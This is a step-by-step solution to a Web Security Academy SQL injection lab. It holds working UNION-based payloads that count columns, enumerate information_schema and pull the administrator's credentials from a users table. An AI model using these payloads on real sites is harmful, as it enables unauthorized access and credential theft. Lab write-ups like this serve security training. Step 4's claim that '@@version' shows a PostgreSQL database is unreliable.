# SQL Injection Lab 05 - SQL injection attack, listing the database contents on non-Oracle databases

## Manual Solution

### 1. Access the lab in Web Security Academy
### 2. Determine the number of columns for UNION attack
   - Test: `/filter?category=Gifts' ORDER BY 1--`
   - Result: No error (at least 1 column exists)
   - Test: `/filter?category=Gifts' ORDER BY 2--`
   - Result: No error (at least 2 columns exist)
   - Test: `/filter?category=Gifts' ORDER BY 3--`
   - Result: Error (confirms 2 columns)

### 3. Verify column data types:
   - Test: `/filter?category=Gifts' UNION SELECT '1', '2'--`
   - Result: Values '1' and '2' displayed (confirms string compatibility)

### 4. Verify database version:
   - Test: `/filter?category=Gifts' UNION SELECT NULL,@@version --`
   - Result: Database version information displayed. So the database is PostgreSQL.

### 5. List the database contents:
   - Test: `/filter?category=Gifts' UNION SELECT NULL,table_name FROM information_schema.tables --`
   - Result: List of tables in the database. There are many tables, we don't know which one has the username and password.

### 6. List the columns like %username% and %password%:
   - Test: `/filter?category=Gifts' UNION SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%username%' OR column_name LIKE '%password%' --`
   - Result: You'll see a table starts with users_... and its columns. Example: users_ylbcwc and its columns are username_fyrfao and password_izzwei.

### 7. Extract the username and password:
   - Test: `/filter?category=Gifts' UNION SELECT [YOUR COLUMN NAME],[YOUR COLUMN NAME] FROM [YOUR_TABLE_NAME]--`
   - Result: administrator and password

### 8. Login to the administrator account

## Automated Solution

### 1. Download the script
### 2. Run the script with the following command: python sqli_lab_05.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)

